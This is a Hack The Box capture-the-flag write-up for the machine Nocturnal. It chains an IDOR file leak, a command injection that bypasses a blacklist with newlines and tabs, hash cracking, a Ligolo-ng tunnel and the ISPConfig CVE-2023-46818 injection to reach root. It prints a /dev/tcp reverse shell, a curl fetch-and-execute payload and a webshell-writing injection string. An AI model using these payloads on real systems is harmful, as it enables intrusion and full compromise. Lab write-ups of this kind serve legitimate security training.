# **HackTheBox — Nocturnal | Full Writeup**

> **Platform:** Hack The Box
> **Author:** k41r0s3
> **Difficulty:** Medium
> **Category:** Web / Linux
> **Date:** March 12, 2026

---

## TL;DR

Nocturnal is a medium Linux machine centered around chaining web vulnerabilities with internal service exploitation. An IDOR vulnerability on a file viewer endpoint allowed downloading files belonging to other users, leaking plaintext credentials from a document. Those credentials unlocked an admin panel where a command injection vulnerability — bypassing a character blacklist using newline and tab characters — delivered a reverse shell as `www-data`. Credentials for the next user were recovered from a SQLite database on disk. From that user's shell, an internally hosted ISPConfig 3.2.2 panel running as root was discovered and accessed via a Ligolo-ng tunnel. Authenticated PHP code injection via CVE-2023-46818 in the language file editor resulted in remote code execution as root.

---

## Attack Chain

```
[Recon]
  nmap → ports 22, 80
  ffuf → discovered view.php, admin.php, dashboard.php
         │
         ▼
[IDOR — File Viewer]
  view.php?username=amanda&file=privacy.odt
  → plaintext credentials leaked from document
         │
         ▼
[Admin Panel Access]
  Login with leaked credentials
  → amanda has admin privileges
         │
         ▼
[Command Injection — Backup Feature]
  Blacklist bypass: \n and \t not filtered
  → reverse shell as www-data
         │
         ▼
[User Shell]
  SQLite DB → MD5 hash → cracked
  → SSH as tobias
         │
         ▼
[User Flag]
  /home/tobias/user.txt → **[REDACTED]**
         │
         ▼
[Internal Recon]
  ss -tlnp → ISPConfig on 127.0.0.1:8080 running as root
  Ligolo-ng tunnel → accessible from Kali at 240.0.0.1:8080
         │
         ▼
[CVE-2023-46818 — ISPConfig PHP Code Injection]
  Authenticated admin → language_edit.php → file_put_contents()
  → RCE as root
         │
         ▼
[Root Flag]
  /root/root.txt → **[REDACTED]**
```

---

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Web Reconnaissance](#2-web-reconnaissance)
3. [IDOR — File Viewer Credential Leak](#3-idor--file-viewer-credential-leak)
4. [Admin Panel — Command Injection](#4-admin-panel--command-injection)
5. [Foothold — www-data Shell](#5-foothold--www-data-shell)
6. [Lateral Movement — SQLite to tobias](#6-lateral-movement--sqlite-to-tobias)
7. [Internal Recon and Tunneling](#7-internal-recon-and-tunneling)
8. [Privilege Escalation — CVE-2023-46818 ISPConfig RCE](#8-privilege-escalation--cve-2023-46818-ispconfig-rce)
9. [Key Takeaways](#9-key-takeaways)
10. [Tools Used](#10-tools-used)

---

## 1. Enumeration

### Nmap Scan

```bash
nmap -sCV -T4 10.129.232.23
```

| Port | State | Service | Version |
| --- | --- | --- | --- |
| 22/tcp | open | ssh | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | open | http | nginx 1.18.0 (Ubuntu) |

**Key finding:** Only two ports open. SSH without credentials is a dead end, making the web application the clear starting point. The nginx/Ubuntu combination suggests Ubuntu 20.04.

### Hosts File

```bash
echo "10.129.232.23 nocturnal.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Reconnaissance

### Directory Fuzzing

```bash
ffuf -u http://nocturnal.htb/FUZZ \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt \
     -fc 404
```

| Path | Description |
| --- | --- |
| `/index.php` | Login page |
| `/register.php` | User registration |
| `/dashboard.php` | Authenticated dashboard |
| `/view.php` | File viewer (authenticated) |
| `/admin.php` | Admin panel |

**Thought process:** Standard surface mapping with a medium-density wordlist. Two endpoints stand out immediately — `admin.php` as a high-value target, and `view.php` which is a file viewer with a URL structure that strongly hints at IDOR. Registering a test account confirmed the application's behavior: users upload files and retrieve them through `view.php` with URL parameters controlling both the username and file name.

### Application Behavior Observed

After registering a test account and uploading a file, the file viewer URL structure was:

```
http://nocturnal.htb/view.php?username=testuser&file=document.pdf
```

Both `username` and `file` are user-controlled with no apparent server-side session validation.

---

## 3. IDOR — File Viewer Credential Leak

### Enumerating Valid Usernames

The `view.php` endpoint behaves differently depending on whether the supplied `username` exists. A valid username with uploaded files produces a populated "Available files for download" list. An invalid username returns an empty list.

**Thought process:** User-controlled `username` parameter in a file viewer with no visible session binding is a textbook IDOR. The immediate goal is enumerating valid usernames, then attempting to download their files. Common usernames (`admin`, `amanda`, `john`, etc.) are worth trying. The file extension matters too — the server likely filters by extension, so testing multiple types is necessary.

```bash
# Probe for valid users and their file types
for user in admin amanda tobias; do
  for ext in pdf odt docx txt xlsx; do
    result=$(curl -s -b "PHPSESSID=<YOUR_SESSION>" \
      "http://nocturnal.htb/view.php?username=${user}&file=x.${ext}" \
      -H "Host: nocturnal.htb" | grep -c "href")
    [ "$result" -gt "0" ] && echo "[HIT] $user - $ext"
  done
done
```

**Key finding:** `username=amanda` with `.odt` extension returns a download link for `privacy.odt`. The file name itself is a strong signal — documents named "privacy" in corporate contexts frequently contain sensitive data.

### Downloading and Extracting the Document

```bash
curl -s -o privacy.odt \
     -b "PHPSESSID=<YOUR_SESSION>" \
     "http://nocturnal.htb/view.php?username=amanda&file=privacy.odt"

pandoc privacy.odt -t plain
```

The document contained plaintext credentials — a temporary password for the user `amanda`.

**Thought process:** Office documents (`.odt`, `.docx`, `.xlsx`) are prime targets in CTF assessments because developers and users routinely embed credentials, keys, or sensitive instructions in them. Once IDOR access to another user's files is confirmed, every document file type should be extracted and read.

---

## 4. Admin Panel — Command Injection

### Accessing the Admin Panel

Logging in with the credentials recovered from `privacy.odt` and navigating to `admin.php` reveals that `amanda` has administrative privileges. The panel exposes a **backup** feature that accepts a password and creates a zip archive of site files.

**Thought process:** Admin backup features that accept user input and invoke system utilities (zip, tar, rsync) are classic command injection vectors. The password field is likely passed directly to something like `zip --password <INPUT> archive.zip files/`. The first step is mapping the character blacklist before building a payload.

### Blacklist Analysis

Testing special characters in the password field:

| Character | Status |
| --- | --- |
| `;` | ❌ Blocked |
| `&` | ❌ Blocked |
| `\|` | ❌ Blocked |
| `$` | ❌ Blocked |
| `` ` `` | ❌ Blocked |
| `{` `}` | ❌ Blocked |
| Space | ❌ Blocked |
| `\n` (newline) | ✅ Not blocked |
| `\t` (tab) | ✅ Not blocked |

**Key finding:** The developer blocked all common shell separators but missed newline (`\n`) and tab (`\t`). In bash, a newline terminates a command identically to a semicolon. Tab substitutes for a space. These two bypasses are sufficient to inject and execute arbitrary commands.

### Payload Construction

Reverse shell script hosted on Kali (`s.sh`):

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_TUN0_IP>/<PORT> 0>&1
```

```bash
# Host the script
python3 -m http.server <PORT>
```

Password field payload — each line separated by a literal newline, spaces replaced by literal tab characters:

```
x
curl	http://<YOUR_TUN0_IP>:<PORT>/s.sh	-o	/tmp/s.sh
bash	/tmp/s.sh
x
```

**Thought process:** The payload structure places a valid zip password on line 1 (`x`) to avoid breaking the zip command itself, then injects two additional shell commands on subsequent lines using the newline separator bypass. Tab replaces every space since the space character is on the blacklist. The multi-line input is submitted through the backup form's password field.

---

## 5. Foothold — www-data Shell

### Listener and Shell Receipt

```bash
nc -lvnp <PORT>
```

Submit the injection payload via the admin backup form. The server downloads and executes the reverse shell script:

```
connect to [<YOUR_TUN0_IP>] from (UNKNOWN) [10.129.232.23] XXXXX
www-data@nocturnal:/var/www/nocturnal.htb$
```

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 6. Lateral Movement — SQLite to tobias

### Database Discovery

```bash
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
```

**Key finding:** `/var/www/nocturnal_database/nocturnal_database.db` — the application's SQLite database, readable as `www-data`.

```bash
sqlite3 /var/www/nocturnal_database/nocturnal_database.db \
  "SELECT username, password FROM users;"
```

| Username | Hash Type |
| --- | --- |
| admin | MD5 |
| tobias | MD5 |
| amanda | MD5 |

**Thought process:** Web application databases always store user credentials. Once filesystem access is gained as the web server user, the database file is the first place to look. SQLite is common for small PHP applications. The hashes are 32-character hex strings — MD5 without a visible salt. MD5 is weak and rockyou.txt covers a large portion of commonly used passwords.

### Hash Cracking

```bash
hashcat -m 0 tobias.hash /usr/share/wordlists/rockyou.txt
```

The hash for `tobias` is successfully cracked. The recovered password is **[REDACTED]**.

### SSH Access

```bash
ssh tobias@nocturnal.htb
```

```bash
cat /home/tobias/user.txt
# **[REDACTED]**
```

---

## 7. Internal Recon and Tunneling

### Internal Port Discovery

```bash
ss -tlnp
```

| Address | Port | Notes |
| --- | --- | --- |
| 127.0.0.1 | 8080 | PHP built-in server — ISPConfig |
| 127.0.0.1 | 3306 | MySQL 8.0.41 |
| 127.0.0.1 | 25 | Sendmail |

**Key finding:** ISPConfig is running on port 8080 as a PHP built-in server. Checking the systemd service unit confirms it runs as `root`:

```bash
cat /etc/systemd/system/ispconfig.service
# User=root
# WorkingDirectory=/var/www/ispconfig
```

**Thought process:** Any service running as root and accessible via localhost is a top-priority escalation target. ISPConfig is a well-known web hosting control panel with a documented CVE history. We need to interact with its web interface from Kali to use standard tooling, so a tunnel is required.

### ISPConfig Version Check

```bash
curl -s http://127.0.0.1:8080/index.php | grep -i "ver="
```

The CSS asset URL in the page source reveals: `ispconfig.css?ver=3.2.2`

**Key finding:** ISPConfig 3.2.2 is vulnerable to **CVE-2023-46818** — authenticated PHP code injection via the language file editor.

### Ligolo-ng Tunnel Setup

Ligolo-ng creates a reverse tunnel allowing Kali to reach the target's localhost services transparently.

**On Kali — start the proxy:**

```bash
./proxy -selfcert -laddr 0.0.0.0:11601
```

**On tobias — connect the agent:**

```bash
wget http://<YOUR_TUN0_IP>:<PORT>/agent -O /tmp/agent
chmod +x /tmp/agent
/tmp/agent -connect <YOUR_TUN0_IP>:11601 -ignore-cert
```

**In the Ligolo UI on Kali:**

```
session          # select the tobias session
start            # activate the tunnel
```

**Add the route on Kali:**

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

ISPConfig is now reachable at `http://240.0.0.1:8080` from Kali as if it were a directly accessible service.

---

## 8. Privilege Escalation — CVE-2023-46818 ISPConfig RCE

### Vulnerability Overview

**CVE-2023-46818** affects ISPConfig versions ≤ 3.2.11. The `records[]` POST parameter in `/admin/language_edit.php` is passed unsanitized into a `file_put_contents()` call that writes PHP language files. An authenticated admin can inject arbitrary PHP code, which is then written to the web root and executed by the server. Since ISPConfig runs as root, this results in OS command execution as root.

### ISPConfig Login

**Thought process:** ISPConfig manages its own user accounts separately from the OS. The admin account credentials need to be tested — trying variations and reuses of already-recovered passwords is standard practice. The password recovered from the SQLite database for the OS user is also worth trying on the ISPConfig panel.

After testing credential variations, access to the ISPConfig admin panel is obtained. The recovered password is **[REDACTED]**.

### Exploit Execution

**Critical insight:** The exploit must run from **Kali** using the Ligolo tunnel IP (`240.0.0.1:8080`), **not** from the tobias SSH shell against `127.0.0.1:8080`. Running the exploit locally from tobias's shell caused CSRF token extraction failures and session handling issues. Ligolo provides transparent network access — Kali's curl handles cookie jars, redirects, and session state correctly as a single client. This is the key difference between the exploit working and silently failing.

```bash
# On Kali
chmod +x exploit.sh
./exploit.sh http://240.0.0.1:8080 admin **[REDACTED]**
```

**Exploit output:**

```
[*] normalizing url...
[*] logging in as user: 'admin'
[+] login successful
[*] random language file to trigger injection: hpusgsqa.lng
[*] sending language edit request to fetch CSRF tokens...
[+] csrf_id = language_edit_XXXXXXXXXXXXXXXXXXXXXXXX
[+] csrf_key = XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[*] building php web shell payload using base64 encoding with ____ markers
[*] sending injection payload using POST to language_edit.php
[+] shell has been deployed to: http://240.0.0.1:8080/admin/sh.php
[*] starting interactive shell. type 'exit' to quit.
ispconfig-shell# whoami
root
ispconfig-shell# cat /root/root.txt
**[REDACTED]**
```

### What the Exploit Does — Step by Step

Understanding the exploit internals is important for both learning and troubleshooting:

1. **Login** — POST to `/login/` with admin credentials. Session cookie captured to a cookie jar file.

2. **CSRF token fetch** — GET request to `/admin/language_edit.php` with a random `lang_file` parameter. The response HTML contains `_csrf_id` and `_csrf_key` hidden input fields.

3. **PHP injection** — POST to `/admin/language_edit.php` with the `records[]` parameter containing:
   ```
   '];file_put_contents('sh.php',base64_decode('<b64_encoded_shell>'));die;#
   ```
   This escapes the PHP string context inside the language file writer and calls `file_put_contents()` directly, writing a webshell to the ISPConfig web root.

4. **Shell interaction** — GET requests to `/admin/sh.php` with commands base64-encoded in the custom `C:` HTTP header. The shell decodes and executes them, returning output between `____` markers.

---

## 9. Key Takeaways

**1. IDOR is never just information disclosure**
The file viewer IDOR seemed minor — it only exposed another user's documents. But that single vulnerability delivered plaintext credentials that unlocked the admin panel and initiated the entire attack chain. The impact of IDOR is always determined by what the accessible data contains, not by the bug itself. Treat every IDOR as a potential critical finding until proven otherwise.

**2. Blacklists are almost always bypassable — map them completely before giving up**
The command injection blacklist blocked every obvious separator character: semicolons, ampersands, pipes, dollars, backticks, and spaces. A surface-level test would suggest injection is impossible. But bash provides multiple ways to separate commands (newline, semicolons) and multiple whitespace characters (space, tab, newline). Systematically testing every alternative before concluding a blacklist is complete is essential. When a blacklist is found, the correct response is mapping it, not accepting it.

**3. Localhost services running as root are the highest-value escalation targets**
`ss -tlnp` showing `127.0.0.1:8080` served by a root-owned systemd unit is a critical finding. Any privileged service with a web interface, an authenticated endpoint, or a known CVE represents a direct path to root. Internal service enumeration should be one of the first steps after gaining a user shell.

**4. Tunnel choice affects exploit success — always run exploits from the right source**
Running the CVE-2023-46818 exploit from tobias's SSH shell against `127.0.0.1` caused repeated CSRF extraction failures and session handling issues. Running the exact same script from Kali via the Ligolo tunnel worked immediately. The exploit's curl-based session handling — cookie jar management, redirect following, CSRF flow — requires a consistent single-client context. When a known-good exploit silently fails, the network path and execution environment are the first things to question.

**5. Version strings hide in asset URLs, not just version pages**
ISPConfig's version was not displayed on an obvious "About" page. It was embedded in a CSS query string: `ispconfig.css?ver=3.2.2`. This is a common pattern — developers often append version strings to static assets for cache-busting. Always check the source of every page you access for version strings in script `src` and link `href` attributes. One version string can unlock the correct CVE and skip hours of guessing.

**6. Document files are a reliable credential source**
The entire machine's attack chain hinged on `privacy.odt` containing a plaintext temporary password. Office documents (`.odt`, `.docx`, `.xlsx`, `.pdf`) regularly contain credentials, keys, internal instructions, and configuration data in real-world assessments. Whenever file access is obtained via any vulnerability, every document file should be extracted and read. Never assume a document is unimportant based on its name alone.

**7. Password reuse across systems is the norm, not the exception**
The ISPConfig admin password was a variation of the credential already recovered from the application's database. Admins routinely reuse or slightly modify passwords across systems they manage. After recovering any credential, always test it — and common variations of it — against every other service discovered on the target.

---

## 10. Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service enumeration |
| `ffuf` | Web directory and file fuzzing |
| `curl` | Manual HTTP request crafting and IDOR testing |
| `sqlite3` | Database credential extraction |
| `hashcat` | MD5 hash cracking |
| `Ligolo-ng` | Reverse tunnel for internal service access |
| `python3 -m http.server` | Payload hosting and file transfer |
| `netcat` | Reverse shell listener |
| `pandoc` | Office document text extraction |
| CVE-2023-46818 PoC | ISPConfig authenticated PHP code injection |

---

*Written by k41r0s3 | HackTheBox | Nocturnal*
